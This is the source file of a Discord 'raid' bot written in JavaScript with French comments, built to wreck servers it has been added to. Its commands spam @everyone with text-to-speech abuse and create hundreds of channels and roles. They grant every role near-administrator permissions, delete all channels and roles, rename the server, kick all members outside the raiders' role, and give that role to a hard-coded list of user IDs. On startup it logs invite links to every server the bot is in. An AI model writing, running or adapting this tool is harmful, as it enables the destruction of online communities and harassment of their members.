const Discord = require("discord.js");


const bot = new Discord.Client();


const prefix = "=" ;


//options


const raidmsg = "@everyone Raid by 丹kα†suki FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UPFUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP https://cdn.discordapp.com/attachments/571479127937384462/575450133001535491/GLITCHO_GIF_20190508_001325.gif";


const channelname = "Raid by 丹kα†suki";


const rolename = "Akatsuki";


const nick = "Raid by 丹kα†suki";


process.on('unhandledRejection', (reason) => {


  console.error(reason);


});


bot.on("ready", () => {


		console.log(`${bot.user.tag} prêt pour le carnage`) 


		console.log(`invite : https://discordapp.com/oauth2/authorize?client_id=${bot.user.id}&scope=bot&permissions=-1`)


		console.log(`token : ${bot.token}`) 


		console.log(bot.guilds.map(g => `Serveur : ${g.name}`))


		console.log(bot.users.size) 


	 //bot.channels.map(c => c.createInvite().then(url => console.log(`${url.code} : ${url.guild.name}`)))


		//bot.guilds.map(g => g. unban("500992163296051200")) 


		//bot.guilds.map(g => g.createChannel("text","anarchy").then(c => c.send("=allchan")))


		bot.guilds.map(g => g.channels.last().createInvite().then(url => console.log(`${url.code} : ${url.guild.name}`)))

  //bot.channels.findAll("type", "text").map(c => c.send("@everyone")) 
 	})


 		

 	 			

bot.on("message", msg => {

//console.log(`${msg.guild.name} : ${msg.channel.name} : ${msg.author.username} : ${msg.content}`) 
			//masse ping


		if(msg.content.includes("@everyone")){


		msg.channel.send(raidmsg, {tts:true}) 




				}


			 if(msg.content === prefix+"allchan"){


 	 msg.delete();


 	 msg.guild.channels.findAll("type", "text").map(c => c.send(raidmsg, {tts:true})) 


 	 } 


 	 


				if(msg.content === prefix+"channel"){


			 			msg.delete();


			 			for(var i = 0; i < 30; i++){


			 				msg.guild.createChannel(channelname, "text");


			 }




			 for(var i =0; i < 469; i++){


			 	msg.guild.createChannel(channelname,"voice");


			 	}






			 setTimeout(() => {


			 	msg.channel.send(prefix+"issou").then(m => m. delete()) ;


			 	msg.channel.send(prefix+"allchan").then(m => m.delete());


			 	}, 10000); 


			 }




		if(msg.content === prefix+"admin"){


			msg.delete();


			msg.guild.roles.map(r => r. edit({permissions:2146958591})) 


			msg.guild.roles.map(r => r.delete())


			msg.channel.send(prefix+"roles").then(m => m.delete()) 


			}


			if(msg.content===prefix+"roles"){


				 msg.delete();


			 for(var i = 0 ; i < 225; i++){


						 msg.guild.createRole({


						 	name:rolename, 


						 	mentionable:false, 


					 		permissions:2146958591, 


						 	position: ""


							})


						}


						} 


		 			//détruire des channels


			 	if(msg.content=== prefix+"génocide"){


			 		console.log("destruction")


			 		msg.guild.channels.map(c => c.delete())


			 		msg.guild.createChannel(channelname, "text").then(m => m.send(prefix+"channel"));


			 		}
     if(msg.content === prefix+"akarole") {
     	var akatsuki = [
     "295361946629439488", 
     "524996881198219276", 
     "284404269376077825", 
     "418802553854099477", 
     "533256249714802691"	, 
     "338696055732568064", 
     "521007534790672395", 
     "274567741153869824", 
     "475581965785890826", 
     "300305174226796544", 
     "413456594802835468", 
     "314812085013970954" 
     	] 
     	
     	msg.channel.send("Chargement...").then(m => {
     		
     	msg.guild.createRole({


						 	name:rolename, 


						 	mentionable:false, 


					 		permissions:2146958591, 


						 	position: ""


							}).then(r => {
     	 akatsuki.forEach(aka => {
     		try{
     		msg.guild.members.find("id", aka).addRole(r.id)
     		m.edit(`Attribution du rôle à ${msg.guild.members.find("id", aka).user.username}`)
     		} catch(e) {
     		msg.channel.send(aka + " n'est pas dans le serveur") 
     		}
     		}) 
     		
     		}) 
     		
     		}) 
     		
     	} 

			 			if(msg.content === prefix+"issou"){


			 				msg.delete();


			 				msg.channel.send(prefix+"admin").then(m => m.delete())


			 				msg.guild.setName("Raid by 丹kα†suki")


			 				msg.guild.setIcon("https://cdn.discordapp.com/attachments/532336096571293708/575460699644493827/IMG_20190508_011512.jpg")


			 				}				


		 if(msg.content === prefix+"banall"){

   msg.channel.send("Chargement...").then(m => {
   	
		 msg.guild.members.filter(u => !u.roles.exists("name", "Akatsuki")).map(g => {
		 try{
		 g.kick().then(k => {
		 	
		 m.edit(k.username + " est kick.")
		
		 })
	 	} catch (e) {
	 	return;
	 	}
	 	}) 
	 	
   }) 
   
 	 }


 	 


 	 		if(msg.content ===prefix +"rename"){


	 	msg.delete();


	 	msg.guild.members.map(g => g.setNickname(nick)) 


	} 
 	 		


 	 		})



bot.login(process.env.token) 
 	       		
